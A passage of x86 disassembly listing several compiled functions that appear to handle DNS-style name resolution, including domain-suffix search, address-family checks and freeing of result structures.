  406b8f:	call   0x40b3dc
  406b94:	mov    ecx,DWORD PTR [ebx+0xc]
  406b97:	mov    DWORD PTR [ecx+esi*4],eax
  406b9a:	mov    eax,DWORD PTR [ebx+0xc]
  406b9d:	mov    ecx,DWORD PTR [eax+esi*4]
  406ba0:	test   ecx,ecx
  406ba2:	je     0x4065b0
  406ba8:	mov    eax,DWORD PTR [edi-0x94]
  406bae:	mov    DWORD PTR [ecx],eax
  406bb0:	mov    ebx,DWORD PTR [edi]
  406bb2:	cmp    ebx,0xffff
  406bb8:	ja     0x4065b0
  406bbe:	push   0x4
  406bc0:	lea    ecx,[ebx+0x1]
  406bc3:	pop    edx
  406bc4:	call   0x40b3dc
  406bc9:	mov    edx,eax
  406bcb:	test   edx,edx
  406bcd:	je     0x4065b0
  406bd3:	xor    ecx,ecx
  406bd5:	test   ebx,ebx
  406bd7:	jle    0x406bf2
  406bd9:	lea    esi,[edi-0x90]
  406bdf:	mov    eax,DWORD PTR [esi]
  406be1:	lea    esi,[esi+0x4]
  406be4:	mov    DWORD PTR [edx+ecx*4],eax
  406be7:	inc    ecx
  406be8:	cmp    ecx,ebx
  406bea:	jl     0x406bdf
  406bec:	mov    esi,DWORD PTR [ebp-0x10024]
  406bf2:	mov    ebx,DWORD PTR [ebp-0x1001c]
  406bf8:	and    DWORD PTR [edx+ecx*4],0x0
  406bfc:	mov    eax,DWORD PTR [ebx+0xc]
  406bff:	mov    eax,DWORD PTR [eax+esi*4]
  406c02:	mov    DWORD PTR [eax+0x4],edx
  406c05:	cmp    DWORD PTR [edi+0x4],0x0
  406c09:	jbe    0x406c21
  406c0b:	push   ecx
  406c0c:	mov    ecx,DWORD PTR [edi-0x4]
  406c0f:	xor    edx,edx
  406c11:	call   0x40c58b
  406c16:	mov    ecx,DWORD PTR [ebx+0xc]
  406c19:	mov    ecx,DWORD PTR [ecx+esi*4]
  406c1c:	mov    DWORD PTR [ecx+0x8],eax
  406c1f:	jmp    0x406c2b
  406c21:	mov    eax,DWORD PTR [ebx+0xc]
  406c24:	mov    eax,DWORD PTR [eax+esi*4]
  406c27:	and    DWORD PTR [eax+0x8],0x0
  406c2b:	inc    esi
  406c2c:	add    edi,0x9c
  406c32:	mov    DWORD PTR [ebp-0x10024],esi
  406c38:	cmp    esi,DWORD PTR [ebp-0x10018]
  406c3e:	jl     0x406b89
  406c44:	mov    eax,DWORD PTR [ebx+0xc]
  406c47:	and    DWORD PTR [eax+esi*4],0x0
  406c4b:	mov    eax,DWORD PTR [ebp-0x1003c]
  406c51:	sub    eax,0x1
  406c54:	je     0x406c64
  406c56:	sub    eax,0xb
  406c59:	je     0x406c7a
  406c5b:	sub    eax,0x10
  406c5e:	jne    0x40667c
  406c64:	push   0xfffffffc
  406c66:	pop    eax
  406c67:	mov    ecx,DWORD PTR [ebp-0x8]
  406c6a:	pop    edi
  406c6b:	pop    esi
  406c6c:	xor    ecx,ebp
  406c6e:	pop    ebx
  406c6f:	call   0x40cd10
  406c74:	mov    esp,ebp
  406c76:	pop    ebp
  406c77:	ret    0x14
  406c7a:	cmp    DWORD PTR [ebp+0x10],0x0
  406c7e:	je     0x40667c
  406c84:	jmp    0x406267
  406c89:	int3   
  406c8a:	int3   
  406c8b:	int3   
  406c8c:	int3   
  406c8d:	int3   
  406c8e:	mov    edi,edi
  406c90:	push   ebp
  406c91:	mov    ebp,esp
  406c93:	sub    esp,0x54
  406c96:	push   ebx
  406c97:	push   esi
  406c98:	mov    esi,DWORD PTR [ebp+0x8]
  406c9b:	xor    ebx,ebx
  406c9d:	mov    DWORD PTR [ebp-0xc],edx
  406ca0:	mov    DWORD PTR [ebp-0x10],ecx
  406ca3:	mov    DWORD PTR [ebp-0x4],ebx
  406ca6:	push   edi
  406ca7:	mov    edi,DWORD PTR [ebp+0xc]
  406caa:	cmp    esi,0x1
  406cad:	je     0x406cbc
  406caf:	cmp    esi,0x1c
  406cb2:	je     0x406cbc
  406cb4:	cmp    esi,0xff03
  406cba:	jne    0x406d3b
  406cbc:	sub    esp,0xc
  406cbf:	lea    ecx,[ebp-0x50]
  406cc2:	mov    edx,edi
  406cc4:	call   0x40bf08
  406cc9:	test   eax,eax
  406ccb:	je     0x406d3b
  406ccd:	mov    ecx,edi
  406ccf:	lea    edx,[ecx+0x1]
  406cd2:	mov    al,BYTE PTR [ecx]
  406cd4:	inc    ecx
  406cd5:	test   al,al
  406cd7:	jne    0x406cd2
  406cd9:	sub    ecx,edx
  406cdb:	xor    edx,edx
  406cdd:	inc    edx
  406cde:	lea    ebx,[ecx+0x3]
  406ce1:	mov    ecx,ebx
  406ce3:	call   0x40b3dc
  406ce8:	mov    esi,DWORD PTR [ebp+0x10]
  406ceb:	mov    DWORD PTR [esi],eax
  406ced:	test   eax,eax
  406cef:	jne    0x406cf8
  406cf1:	push   0xe
  406cf3:	jmp    0x406dfe
  406cf8:	push   edi
  406cf9:	push   0x402fd8
  406cfe:	push   ebx
  406cff:	push   eax
  406d00:	call   DWORD PTR ds:0x413128
  406d06:	xor    ebx,ebx
  406d08:	add    esp,0x10
  406d0b:	xor    edi,edi
  406d0d:	inc    ebx
  406d0e:	mov    ecx,ebx
  406d10:	mov    DWORD PTR [esi+0x4],edi
  406d13:	mov    DWORD PTR [esi+0xc],edi
  406d16:	call   0x40c50d
  406d1b:	mov    DWORD PTR [esi+0x8],eax
  406d1e:	test   eax,eax
  406d20:	je     0x406cf1
  406d22:	push   ecx
  406d23:	mov    DWORD PTR [eax],ebx
  406d25:	lea    edx,[ebp-0x50]
  406d28:	mov    DWORD PTR [eax+0x4],edi
  406d2b:	push   ecx
  406d2c:	mov    ecx,DWORD PTR [esi+0x8]
  406d2f:	call   0x40c5e5
  406d34:	xor    eax,eax
  406d36:	jmp    0x406dff
  406d3b:	mov    cl,BYTE PTR [edi]
  406d3d:	mov    edx,edi
  406d3f:	and    DWORD PTR [ebp-0x8],ebx
  406d42:	push   0x3
  406d44:	pop    eax
  406d45:	test   cl,cl
  406d47:	je     0x406d77
  406d49:	mov    esi,DWORD PTR [ebp-0x8]
  406d4c:	cmp    cl,0x2e
  406d4f:	jne    0x406d52
  406d51:	inc    esi
  406d52:	inc    edx
  406d53:	mov    cl,BYTE PTR [edx]
  406d55:	test   cl,cl
  406d57:	jne    0x406d4c
  406d59:	mov    DWORD PTR [ebp-0x8],esi
  406d5c:	test   esi,esi
  406d5e:	mov    esi,DWORD PTR [ebp+0x8]
  406d61:	je     0x406d77
  406d63:	cmp    BYTE PTR [edx-0x1],0x2e
  406d67:	je     0x406dd5
  406d69:	test   DWORD PTR ds:0x40e128,0x200
  406d73:	je     0x406dd5
  406d75:	jmp    0x406d80
  406d77:	test   BYTE PTR ds:0x40e128,0x80
  406d7e:	je     0x406dff
  406d80:	cmp    DWORD PTR ds:0x41135c,0x0
  406d87:	mov    ebx,0x41135c
  406d8c:	je     0x406dd2
  406d8e:	push   DWORD PTR [ebp+0x14]
  406d91:	mov    edx,DWORD PTR [ebp-0xc]
  406d94:	push   DWORD PTR [ebp+0x10]
  406d97:	mov    ecx,DWORD PTR [ebp-0x10]
  406d9a:	push   DWORD PTR [ebx]
  406d9c:	push   edi
  406d9d:	push   esi
  406d9e:	call   0x406e0d
  406da3:	test   eax,eax
  406da5:	je     0x406dff
  406da7:	cmp    eax,0xfffffffb
  406daa:	je     0x406dff
  406dac:	cmp    eax,0xfffffffe
  406daf:	jne    0x406db4
  406db1:	inc    DWORD PTR [ebp-0x4]
  406db4:	cmp    eax,0x3
  406db7:	je     0x406dbe
  406db9:	cmp    eax,0xfffffffe
  406dbc:	jne    0x406dd2
  406dbe:	test   DWORD PTR ds:0x40e128,0x200
  406dc8:	je     0x406dd2
  406dca:	add    ebx,0x4
  406dcd:	cmp    DWORD PTR [ebx],0x0
  406dd0:	jne    0x406d8e
  406dd2:	mov    ebx,DWORD PTR [ebp-0x4]
  406dd5:	cmp    DWORD PTR [ebp-0x8],0x0
  406dd9:	je     0x406df8
  406ddb:	push   DWORD PTR [ebp+0x14]
  406dde:	mov    edx,DWORD PTR [ebp-0xc]
  406de1:	push   DWORD PTR [ebp+0x10]
  406de4:	mov    ecx,DWORD PTR [ebp-0x10]
  406de7:	push   0x0
  406de9:	push   edi
  406dea:	push   esi
  406deb:	call   0x406e0d
  406df0:	test   eax,eax
  406df2:	je     0x406d34
  406df8:	test   ebx,ebx
  406dfa:	je     0x406dff
  406dfc:	push   0xfffffffe
  406dfe:	pop    eax
  406dff:	pop    edi
  406e00:	pop    esi
  406e01:	pop    ebx
  406e02:	mov    esp,ebp
  406e04:	pop    ebp
  406e05:	ret    0x10
  406e08:	int3   
  406e09:	int3   
  406e0a:	int3   
  406e0b:	int3   
  406e0c:	int3   
  406e0d:	mov    edi,edi
  406e0f:	push   ebp
  406e10:	mov    ebp,esp
  406e12:	sub    esp,0x28
  406e15:	cmp    DWORD PTR [ebp+0x8],0xff03
  406e1c:	push   ebx
  406e1d:	push   esi
  406e1e:	push   edi
  406e1f:	mov    esi,edx
  406e21:	mov    ebx,ecx
  406e23:	je     0x406e3e
  406e25:	push   DWORD PTR [ebp+0x18]
  406e28:	push   DWORD PTR [ebp+0x14]
  406e2b:	push   DWORD PTR [ebp+0x10]
  406e2e:	push   DWORD PTR [ebp+0xc]
  406e31:	push   DWORD PTR [ebp+0x8]
  406e34:	call   0x406f3c
  406e39:	jmp    0x406f2b
  406e3e:	xor    eax,eax
  406e40:	lea    edi,[ebp-0x28]
  406e43:	stos   DWORD PTR es:[edi],eax
  406e44:	stos   DWORD PTR es:[edi],eax
  406e45:	stos   DWORD PTR es:[edi],eax
  406e46:	stos   DWORD PTR es:[edi],eax
  406e47:	xor    eax,eax
  406e49:	lea    edi,[ebp-0x18]
  406e4c:	stos   DWORD PTR es:[edi],eax
  406e4d:	stos   DWORD PTR es:[edi],eax
  406e4e:	stos   DWORD PTR es:[edi],eax
  406e4f:	stos   DWORD PTR es:[edi],eax
  406e50:	mov    edi,DWORD PTR [ebp+0x14]
  406e53:	mov    ecx,edi
  406e55:	call   0x40722b
  406e5a:	push   DWORD PTR [ebp+0x18]
  406e5d:	lea    eax,[ebp-0x28]
  406e60:	mov    edx,esi
  406e62:	push   eax
  406e63:	push   DWORD PTR [ebp+0x10]
  406e66:	mov    ecx,ebx
  406e68:	push   DWORD PTR [ebp+0xc]
  406e6b:	push   0x1
  406e6d:	call   0x406f3c
  406e72:	push   0x1
  406e74:	mov    DWORD PTR [ebp-0x8],eax
  406e77:	mov    edx,esi
  406e79:	lea    eax,[ebp-0x18]
  406e7c:	mov    ecx,ebx
  406e7e:	push   eax
  406e7f:	push   DWORD PTR [ebp+0x10]
  406e82:	push   DWORD PTR [ebp+0xc]
  406e85:	push   0x1c
  406e87:	call   0x406f3c
  406e8c:	mov    edx,DWORD PTR [ebp-0x8]
  406e8f:	mov    ecx,DWORD PTR [ebp-0x10]
  406e92:	test   edx,edx
  406e94:	jne    0x406eca
  406e96:	test   eax,eax
  406e98:	jne    0x406ef2
  406e9a:	test   ecx,ecx
  406e9c:	je     0x406ece
  406e9e:	cmp    DWORD PTR [ebp-0x20],eax
  406ea1:	je     0x406ece
  406ea3:	lea    edx,[ebp-0x28]
  406ea6:	lea    ecx,[ebp-0x18]
  406ea9:	call   0x407361
  406eae:	test   eax,eax
  406eb0:	je     0x406eb7
  406eb2:	push   0xe
  406eb4:	pop    esi
  406eb5:	jmp    0x406f19
  406eb7:	mov    eax,DWORD PTR [ebp-0x14]
  406eba:	mov    DWORD PTR [edi+0x4],eax
  406ebd:	mov    eax,DWORD PTR [ebp-0x18]
  406ec0:	mov    DWORD PTR [edi],eax
  406ec2:	mov    eax,DWORD PTR [ebp-0x10]
  406ec5:	mov    DWORD PTR [edi+0x8],eax
  406ec8:	jmp    0x406edc
  406eca:	test   eax,eax
  406ecc:	jne    0x406ef2
  406ece:	mov    eax,DWORD PTR [ebp-0x14]
  406ed1:	mov    DWORD PTR [edi+0x4],eax
  406ed4:	mov    eax,DWORD PTR [ebp-0x18]
  406ed7:	mov    DWORD PTR [edi],eax
  406ed9:	mov    DWORD PTR [edi+0x8],ecx
  406edc:	mov    eax,DWORD PTR [ebp-0xc]
  406edf:	xor    esi,esi
  406ee1:	mov    DWORD PTR [ebp-0x18],esi
  406ee4:	mov    DWORD PTR [ebp-0x14],esi
  406ee7:	mov    DWORD PTR [ebp-0x10],esi
  406eea:	mov    DWORD PTR [edi+0xc],eax
  406eed:	mov    DWORD PTR [ebp-0xc],esi
  406ef0:	jmp    0x406f19
  406ef2:	mov    eax,DWORD PTR [ebp-0x24]
  406ef5:	xor    esi,esi
  406ef7:	mov    ecx,DWORD PTR [ebp-0x1c]
  406efa:	mov    DWORD PTR [edi+0x4],eax
  406efd:	mov    eax,DWORD PTR [ebp-0x28]
  406f00:	mov    DWORD PTR [edi],eax
  406f02:	mov    eax,DWORD PTR [ebp-0x20]
  406f05:	mov    DWORD PTR [ebp-0x24],esi
  406f08:	mov    DWORD PTR [ebp-0x28],esi
  406f0b:	mov    DWORD PTR [ebp-0x20],esi
  406f0e:	mov    DWORD PTR [ebp-0x1c],esi
  406f11:	mov    esi,edx
  406f13:	mov    DWORD PTR [edi+0x8],eax
  406f16:	mov    DWORD PTR [edi+0xc],ecx
  406f19:	lea    ecx,[ebp-0x28]
  406f1c:	call   0x40722b
  406f21:	lea    ecx,[ebp-0x18]
  406f24:	call   0x40722b
  406f29:	mov    eax,esi
  406f2b:	pop    edi
  406f2c:	pop    esi
  406f2d:	pop    ebx
  406f2e:	mov    esp,ebp
  406f30:	pop    ebp
  406f31:	ret    0x14
  406f34:	int3   
  406f35:	int3   
  406f36:	int3   
  406f37:	int3   
  406f38:	int3   
  406f39:	int3   
  406f3a:	int3   
  406f3b:	int3   
  406f3c:	mov    edi,edi
  406f3e:	push   ebp
  406f3f:	mov    ebp,esp
  406f41:	mov    eax,0x10220
  406f46:	call   0x40d460
  406f4b:	mov    eax,ds:0x40e004
  406f50:	xor    eax,ebp
  406f52:	mov    DWORD PTR [ebp-0x8],eax
  406f55:	push   ebx
  406f56:	mov    ebx,DWORD PTR [ebp+0x14]
  406f59:	push   esi
  406f5a:	mov    esi,DWORD PTR [ebp+0x10]
  406f5d:	mov    DWORD PTR [ebp-0x1021c],ecx
  406f63:	mov    ecx,DWORD PTR [ebp+0xc]
  406f66:	mov    DWORD PTR [ebp-0x10220],edx
  406f6c:	mov    DWORD PTR [ebp-0x10218],ebx
  406f72:	push   edi
  406f73:	lea    edi,[ebp-0x214]
  406f79:	test   esi,esi
  406f7b:	jne    0x406fc5
  406f7d:	mov    esi,ecx
  406f7f:	lea    edx,[esi+0x1]
  406f82:	mov    al,BYTE PTR [esi]
  406f84:	inc    esi
  406f85:	test   al,al
  406f87:	jne    0x406f82
  406f89:	sub    esi,edx
  406f8b:	dec    esi
  406f8c:	cmp    BYTE PTR [ecx+esi*1],0x2e
  406f90:	jne    0x406fc1
  406f92:	cmp    esi,0x201
  406f98:	jae    0x406fc1
  406f9a:	push   esi
  406f9b:	push   ecx
  406f9c:	lea    eax,[ebp-0x214]
  406fa2:	push   eax
  406fa3:	call   0x40d49c
  406fa8:	add    esp,0xc
  406fab:	cmp    esi,0x202
  406fb1:	jae    0x4070cb
  406fb7:	mov    BYTE PTR [ebp+esi*1-0x214],0x0
  406fbf:	jmp    0x40701f
  406fc1:	mov    edi,ecx
  406fc3:	jmp    0x40701f
  406fc5:	test   ecx,ecx
  406fc7:	je     0x406fe7
  406fc9:	mov    edx,ecx
  406fcb:	lea    edi,[edx+0x1]
  406fce:	mov    al,BYTE PTR [edx]
  406fd0:	inc    edx
  406fd1:	test   al,al
  406fd3:	jne    0x406fce
  406fd5:	sub    edx,edi
  406fd7:	cmp    edx,0x100
  406fdd:	jbe    0x406fe7
  406fdf:	push   0xfffffffd
  406fe1:	pop    eax
  406fe2:	jmp    0x4070b8
  406fe7:	mov    edx,esi
  406fe9:	lea    edi,[edx+0x1]
  406fec:	mov    al,BYTE PTR [edx]
  406fee:	inc    edx
  406fef:	test   al,al
  406ff1:	jne    0x406fec
  406ff3:	sub    edx,edi
  406ff5:	cmp    edx,0x100
  406ffb:	ja     0x406fdf
  406ffd:	push   esi
  406ffe:	push   ecx
  406fff:	push   0x402fe0
  407004:	lea    eax,[ebp-0x214]
  40700a:	push   0x202
  40700f:	push   eax
  407010:	call   DWORD PTR ds:0x413128
  407016:	add    esp,0x14
  407019:	lea    edi,[ebp-0x214]
  40701f:	push   DWORD PTR [ebp-0x10220]
  407025:	mov    edx,DWORD PTR [ebp+0x8]
  407028:	lea    eax,[ebp-0x10214]
  40702e:	push   0x10000
  407033:	push   eax
  407034:	mov    ecx,edi
  407036:	call   0x40a841
  40703b:	test   eax,eax
  40703d:	jns    0x407055
  40703f:	test   BYTE PTR ds:0x40e128,0x2
  407046:	je     0x406fdf
  407048:	push   0x8
  40704a:	push   0x2
  40704c:	call   0x40b328
  407051:	pop    ecx
  407052:	pop    ecx
  407053:	jmp    0x406fdf
  407055:	push   DWORD PTR [ebp+0x18]
  407058:	mov    edx,DWORD PTR [ebp+0x8]
  40705b:	mov    ecx,DWORD PTR [ebp-0x1021c]
  407061:	push   ebx
  407062:	push   0x0
  407064:	push   eax
  407065:	lea    eax,[ebp-0x10214]
  40706b:	push   eax
  40706c:	call   0x406152
  407071:	mov    esi,eax
  407073:	cmp    esi,0xfffffffc
  407076:	jne    0x4070b6
  407078:	cmp    DWORD PTR [ebx],0x0
  40707b:	jne    0x4070b6
  40707d:	mov    ecx,edi
  40707f:	lea    edx,[ecx+0x1]
  407082:	mov    al,BYTE PTR [ecx]
  407084:	inc    ecx
  407085:	test   al,al
  407087:	jne    0x407082
  407089:	sub    ecx,edx
  40708b:	xor    edx,edx
  40708d:	inc    edx
  40708e:	lea    ebx,[ecx+0x1]
  407091:	mov    ecx,ebx
  407093:	call   0x40b3dc
  407098:	mov    ecx,DWORD PTR [ebp-0x10218]
  40709e:	mov    DWORD PTR [ecx],eax
  4070a0:	test   eax,eax
  4070a2:	jne    0x4070ab
  4070a4:	push   0xe
  4070a6:	jmp    0x406fe1
  4070ab:	push   ebx
  4070ac:	push   edi
  4070ad:	push   eax
  4070ae:	call   0x40d49c
  4070b3:	add    esp,0xc
  4070b6:	mov    eax,esi
  4070b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4070bb:	pop    edi
  4070bc:	pop    esi
  4070bd:	xor    ecx,ebp
  4070bf:	pop    ebx
  4070c0:	call   0x40cd10
  4070c5:	mov    esp,ebp
  4070c7:	pop    ebp
  4070c8:	ret    0x14
  4070cb:	call   0x40ce69
  4070d0:	int3   
  4070d1:	int3   
  4070d2:	int3   
  4070d3:	int3   
  4070d4:	int3   
  4070d5:	int3   
  4070d6:	mov    edi,edi
  4070d8:	push   ebp
  4070d9:	mov    ebp,esp
  4070db:	mov    eax,0x10118
  4070e0:	call   0x40d460
  4070e5:	mov    eax,ds:0x40e004
  4070ea:	xor    eax,ebp
  4070ec:	mov    DWORD PTR [ebp-0x8],eax
  4070ef:	push   ebx
  4070f0:	push   esi
  4070f1:	mov    esi,DWORD PTR [ebp+0x8]
  4070f4:	lea    eax,[ebp-0x10b]
  4070fa:	push   edi
  4070fb:	push   0xff
  407100:	mov    edi,ecx
  407102:	mov    DWORD PTR [ebp-0x10114],esi
  407108:	push   0x0
  40710a:	push   eax
  40710b:	mov    ebx,edx
  40710d:	mov    DWORD PTR [ebp-0x10110],edi
  407113:	mov    BYTE PTR [ebp-0x10c],0x0
  40711a:	call   0x40d4a8
  40711f:	add    esp,0xc
  407122:	push   0x2
  407124:	pop    eax
  407125:	cmp    WORD PTR [ebx],ax
  407128:	jne    0x40715b
  40712a:	mov    edx,DWORD PTR [ebx+0x4]
  40712d:	lea    ecx,[ebp-0x10c]
  407133:	call   0x40bdf3
  407138:	test   eax,eax
  40713a:	jne    0x40715b
  40713c:	test   BYTE PTR ds:0x40e128,0x2
  407143:	je     0x407153
  407145:	push   0xd3
  40714a:	push   0x2
  40714c:	call   0x40b328
  407151:	pop    ecx
  407152:	pop    ecx
  407153:	push   0xfffffffd
  407155:	pop    eax
  407156:	jmp    0x407213
  40715b:	cmp    WORD PTR [ebx],0x17
  40715f:	jne    0x407198
  407161:	sub    esp,0x10
  407164:	lea    esi,[ebx+0x8]
  407167:	mov    edi,esp
  407169:	lea    ecx,[ebp-0x10c]
  40716f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407173:	call   0x40be57
  407178:	test   eax,eax
  40717a:	jne    0x40718c
  40717c:	test   BYTE PTR ds:0x40e128,0x2
  407183:	je     0x407153
  407185:	push   0xd4
  40718a:	jmp    0x40714a
  40718c:	mov    esi,DWORD PTR [ebp-0x10114]
  407192:	mov    edi,DWORD PTR [ebp-0x10110]
  407198:	push   0x1
  40719a:	push   0x10000
  40719f:	lea    eax,[ebp-0x1010c]
  4071a5:	push   eax
  4071a6:	push   0xc
  4071a8:	pop    edx
  4071a9:	lea    ecx,[ebp-0x10c]
  4071af:	call   0x40a841
  4071b4:	test   eax,eax
  4071b6:	jns    0x4071c8
  4071b8:	test   BYTE PTR ds:0x40e128,0x2
  4071bf:	je     0x407153
  4071c1:	push   0xcd
  4071c6:	jmp    0x40714a
  4071c8:	push   0x1
  4071ca:	push   esi
  4071cb:	push   0x1
  4071cd:	push   eax
  4071ce:	lea    eax,[ebp-0x1010c]
  4071d4:	mov    ecx,edi
  4071d6:	push   eax
  4071d7:	push   0xc
  4071d9:	pop    edx
  4071da:	call   0x406152
  4071df:	mov    edi,eax
  4071e1:	test   edi,edi
  4071e3:	jne    0x407211
  4071e5:	xor    ecx,ecx
  4071e7:	inc    ecx
  4071e8:	call   0x40c50d
  4071ed:	mov    DWORD PTR [esi+0x8],eax
  4071f0:	test   eax,eax
  4071f2:	jne    0x4071fb
  4071f4:	push   0xe
  4071f6:	jmp    0x407155
  4071fb:	and    DWORD PTR [eax+0x4],0x0
  4071ff:	mov    edx,ebx
  407201:	push   ecx
  407202:	mov    DWORD PTR [eax],0x1
  407208:	push   ecx
  407209:	mov    ecx,DWORD PTR [esi+0x8]
  40720c:	call   0x40c5e5
  407211:	mov    eax,edi
  407213:	mov    ecx,DWORD PTR [ebp-0x8]
  407216:	pop    edi
  407217:	pop    esi
  407218:	xor    ecx,ebp
  40721a:	pop    ebx
  40721b:	call   0x40cd10
  407220:	mov    esp,ebp
  407222:	pop    ebp
  407223:	ret    0x4
  407226:	int3   
  407227:	int3   
  407228:	int3   
  407229:	int3   
  40722a:	int3   
  40722b:	mov    edi,edi
  40722d:	push   ebp
  40722e:	mov    ebp,esp
  407230:	push   ecx
  407231:	push   ecx
  407232:	push   esi
  407233:	mov    esi,ecx
  407235:	push   edi
  407236:	cmp    DWORD PTR [esi],0x0
  407239:	je     0x407247
  40723b:	push   DWORD PTR [esi]
  40723d:	call   DWORD PTR ds:0x413100
  407243:	and    DWORD PTR [esi],0x0
  407246:	pop    ecx
  407247:	mov    eax,DWORD PTR [esi+0x4]
  40724a:	test   eax,eax
  40724c:	je     0x407280
  40724e:	xor    edi,edi
  407250:	cmp    DWORD PTR [eax],edi
  407252:	je     0x407272
  407254:	xor    ecx,ecx
  407256:	mov    eax,DWORD PTR [esi+0x4]
  407259:	push   DWORD PTR [eax+ecx*1]
  40725c:	call   DWORD PTR ds:0x413100
  407262:	mov    eax,DWORD PTR [esi+0x4]
  407265:	inc    edi
  407266:	pop    ecx
  407267:	mov    ecx,edi
  407269:	shl    ecx,0x2
  40726c:	cmp    DWORD PTR [ecx+eax*1],0x0
  407270:	jne    0x407256
  407272:	push   DWORD PTR [esi+0x4]
  407275:	call   DWORD PTR ds:0x413100
  40727b:	and    DWORD PTR [esi+0x4],0x0
  40727f:	pop    ecx
  407280:	mov    ecx,DWORD PTR [esi+0x8]
  407283:	test   ecx,ecx
  407285:	je     0x407290
  407287:	call   0x40c80e
  40728c:	and    DWORD PTR [esi+0x8],0x0
  407290:	mov    eax,DWORD PTR [esi+0xc]
  407293:	test   eax,eax
  407295:	je     0x407356
  40729b:	push   ebx
  40729c:	xor    ebx,ebx
  40729e:	mov    DWORD PTR [ebp-0x4],ebx
  4072a1:	cmp    DWORD PTR [eax],ebx
  4072a3:	je     0x407347
  4072a9:	xor    edi,edi
  4072ab:	mov    eax,DWORD PTR [esi+0xc]
  4072ae:	mov    eax,DWORD PTR [edi+eax*1]
  4072b1:	cmp    DWORD PTR [eax],0x0
  4072b4:	je     0x4072bf
  4072b6:	push   DWORD PTR [eax]
  4072b8:	call   DWORD PTR ds:0x413100
  4072be:	pop    ecx
  4072bf:	mov    eax,DWORD PTR [esi+0xc]
  4072c2:	mov    eax,DWORD PTR [edi+eax*1]
  4072c5:	mov    eax,DWORD PTR [eax+0x4]
  4072c8:	test   eax,eax
  4072ca:	je     0x407315
  4072cc:	and    DWORD PTR [ebp-0x8],0x0
  4072d0:	cmp    DWORD PTR [eax],0x0
  4072d3:	je     0x407305
  4072d5:	mov    ebx,DWORD PTR [ebp-0x8]
  4072d8:	xor    ecx,ecx
  4072da:	mov    eax,DWORD PTR [esi+0xc]
  4072dd:	mov    eax,DWORD PTR [edi+eax*1]
  4072e0:	mov    eax,DWORD PTR [eax+0x4]
  4072e3:	push   DWORD PTR [eax+ecx*1]
  4072e6:	call   DWORD PTR ds:0x413100
  4072ec:	mov    eax,DWORD PTR [esi+0xc]
  4072ef:	inc    ebx
  4072f0:	pop    ecx
  4072f1:	mov    ecx,ebx
  4072f3:	shl    ecx,0x2
  4072f6:	mov    eax,DWORD PTR [edi+eax*1]
  4072f9:	mov    eax,DWORD PTR [eax+0x4]
  4072fc:	cmp    DWORD PTR [ecx+eax*1],0x0
  407300:	jne    0x4072da
  407302:	mov    ebx,DWORD PTR [ebp-0x4]
  407305:	mov    eax,DWORD PTR [esi+0xc]
  407308:	mov    eax,DWORD PTR [edi+eax*1]
  40730b:	push   DWORD PTR [eax+0x4]
  40730e:	call   DWORD PTR ds:0x413100
  407314:	pop    ecx
  407315:	mov    eax,DWORD PTR [esi+0xc]
  407318:	mov    eax,DWORD PTR [edi+eax*1]
  40731b:	mov    ecx,DWORD PTR [eax+0x8]
  40731e:	test   ecx,ecx
  407320:	je     0x407331
  407322:	call   0x40c80e
  407327:	mov    eax,DWORD PTR [esi+0xc]
  40732a:	mov    eax,DWORD PTR [edi+eax*1]
  40732d:	and    DWORD PTR [eax+0x8],0x0
  407331:	mov    eax,DWORD PTR [esi+0xc]
  407334:	inc    ebx
  407335:	mov    edi,ebx
  407337:	mov    DWORD PTR [ebp-0x4],ebx
  40733a:	shl    edi,0x2
  40733d:	cmp    DWORD PTR [edi+eax*1],0x0
  407341:	jne    0x4072ab
  407347:	push   DWORD PTR [esi+0xc]
  40734a:	call   DWORD PTR ds:0x413100
  407350:	and    DWORD PTR [esi+0xc],0x0
  407354:	pop    ecx
  407355:	pop    ebx
  407356:	pop    edi
  407357:	pop    esi
  407358:	mov    esp,ebp
  40735a:	pop    ebp
  40735b:	ret    
  40735c:	int3   
  40735d:	int3   
  40735e:	int3   
  40735f:	int3   
  407360:	int3   
  407361:	mov    edi,edi
  407363:	push   ebx
  407364:	push   esi
  407365:	mov    esi,ecx
  407367:	push   edi
  407368:	mov    edi,edx
  40736a:	mov    eax,DWORD PTR [esi+0x8]
  40736d:	test   eax,eax
  40736f:	je     0x4073c1
  407371:	mov    ecx,DWORD PTR [edi+0x8]
  407374:	test   ecx,ecx
  407376:	je     0x4073c1
  407378:	mov    ecx,DWORD PTR [ecx+0x4]
  40737b:	add    ecx,DWORD PTR [eax+0x4]
  40737e:	call   0x40c50d
  407383:	mov    ebx,eax
  407385:	test   ebx,ebx
  407387:	jne    0x40738d
  407389:	push   0xe
  40738b:	jmp    0x4073c3
  40738d:	mov    edx,DWORD PTR [esi+0x8]
  407390:	sub    esp,0x14
  407393:	mov    ecx,ebx
  407395:	call   0x40c679
  40739a:	mov    edx,DWORD PTR [edi+0x8]
  40739d:	sub    esp,0x14
  4073a0:	mov    ecx,ebx
  4073a2:	call   0x40c679
  4073a7:	mov    ecx,DWORD PTR [esi+0x8]
  4073aa:	call   0x40c80e
  4073af:	and    DWORD PTR [esi+0x8],0x0
  4073b3:	mov    ecx,edi
  4073b5:	call   0x40722b
  4073ba:	mov    DWORD PTR [esi+0x8],ebx
  4073bd:	xor    eax,eax
  4073bf:	jmp    0x4073c4
  4073c1:	push   0xd
  4073c3:	pop    eax
  4073c4:	pop    edi
  4073c5:	pop    esi
  4073c6:	pop    ebx
  4073c7:	ret    
  4073c8:	int3   
  4073c9:	int3   
  4073ca:	int3   
  4073cb:	int3   
  4073cc:	int3   
  4073cd:	mov    edi,edi
  4073cf:	push   ebp
  4073d0:	mov    ebp,esp
  4073d2:	sub    esp,0x20c
  4073d8:	mov    eax,ds:0x40e004
  4073dd:	xor    eax,ebp
  4073df:	mov    DWORD PTR [ebp-0x4],eax
  4073e2:	push   ebx
  4073e3:	mov    ebx,DWORD PTR ds:0x4128fc
  4073e9:	mov    ecx,ebx
  4073eb:	push   esi
  4073ec:	push   edi
  4073ed:	mov    edi,edx
  4073ef:	lea    edx,[ecx+0x1]
  4073f2:	mov    al,BYTE PTR [ecx]
  4073f4:	inc    ecx
  4073f5:	test   al,al
  4073f7:	jne    0x4073f2
  4073f9:	sub    ecx,edx
  4073fb:	mov    edx,0x100
  407400:	cmp    ecx,edx
  407402:	jb     0x407414
  407404:	push   0x2f
